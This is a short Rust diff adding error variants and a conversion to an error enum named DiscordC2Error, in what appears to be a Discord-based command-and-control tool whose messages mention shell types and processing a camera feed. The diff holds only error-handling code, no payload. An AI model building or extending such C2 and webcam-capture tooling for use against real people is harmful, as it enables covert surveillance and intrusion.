@@ -3,6 +3,7 @@ use serenity::prelude::SerenityError;
 use std::error::Error;
 use std::fmt;
 use std::fmt::Debug;
+use serde::de::StdError;
 
 #[derive(Debug)]
 pub enum DiscordC2Error {
@@ -13,7 +14,9 @@ pub enum DiscordC2Error {
     DiscordError(String),
     NoSessionChannel,
     CommandNotFound(String),
-    InvalidShellType
+    InvalidShellType,
+    StdError(String),
+    InvalidInput(String),
 }
 
 impl fmt::Display for DiscordC2Error {
@@ -34,6 +37,10 @@ impl fmt::Display for DiscordC2Error {
             }
             DiscordC2Error::InvalidShellType => {
                 write!(f, "Invalid shell type was provided.")
+            }
+            DiscordC2Error::StdError(s) => write!(f, "Ran into error processing camera feed: {}", s),
+            DiscordC2Error::InvalidInput(s) => {
+                write!(f, "Invalid input was provided: {}", s)
             }
         }
     }
@@ -59,4 +66,9 @@ impl From<SerenityError> for DiscordC2Error {
     }
 }
 
+impl From <Box<dyn StdError>> for DiscordC2Error {
+    fn from(error: Box<dyn StdError>) -> Self {
+        DiscordC2Error::StdError(error.to_string())
+    }
+}
 impl Error for DiscordC2Error {}
